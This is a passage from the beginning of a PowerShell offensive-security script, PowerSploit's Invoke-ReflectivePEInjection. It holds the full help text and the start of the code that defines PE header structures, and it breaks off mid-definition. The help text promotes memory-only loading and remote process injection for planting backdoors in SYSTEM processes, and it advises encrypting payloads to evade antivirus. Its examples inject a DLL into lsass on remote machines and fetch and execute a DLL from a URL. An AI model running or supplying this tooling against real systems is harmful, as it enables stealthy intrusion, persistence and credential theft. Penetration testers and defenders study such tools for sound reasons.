function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
please lead the Notes section (GENERAL NOTES) for information on how to use them.


1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.


2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
remote process. 


While this script provides functionality to specify a file to load from disk or from a URL, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
containing the file you'd like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will
bypass A/V. Another advantage is you won't be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
blog linked below (thanks to whitey).

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Version: 1.2

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEPath

The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.

.PARAMETER PEUrl

A URL containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
	Options: String, WString, Void. See notes for more information.
	IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
	
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.
	
.EXAMPLE

Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
Note that the file name on the website can be any file extension.
Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	the wchar_t* returned by WStringFunc() from all the computers.
Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
	-Can return DLL output to user when run remotely or locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
	-Can NOT return DLL output to the user when run remotely OR locally.
	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.



DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection

Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/

#>

[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Parameter(Position = 6)]
    [Switch]
    $ForceASLR
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
